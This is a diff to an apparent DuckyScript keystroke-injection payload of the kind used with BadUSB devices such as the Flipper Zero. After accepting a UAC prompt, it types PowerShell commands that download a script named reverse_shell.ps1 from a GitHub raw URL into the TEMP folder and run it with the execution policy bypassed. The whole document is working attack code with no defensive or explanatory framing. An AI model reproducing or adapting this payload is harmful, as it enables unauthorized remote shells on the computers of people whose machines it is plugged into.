@@ -7,8 +7,11 @@ REM Press Alt+Y to confirm UAC prompt
 ALT Y
 DELAY 500
 
-REM Replace the URL below with the actual URL of the file to download
-STRING $url = "http://example.com/yourfile.exe"; $output = "$env:TEMP\downloadedfile.exe"; Invoke-WebRequest -Uri $url -OutFile $output;
+REM Download the PowerShell script
+STRING $url = "https://raw.githubusercontent.com/1tsMeMario/flipper_payloads/main/reverse_shell.ps1"; $output = "$env:TEMP\reverse_shell.ps1"; Invoke-WebRequest -Uri $url -OutFile $output;
 ENTER
+DELAY 500
 
-DELAY 1000
+REM Run the downloaded PowerShell script
+STRING powershell.exe -ExecutionPolicy Bypass -File $output
+ENTER
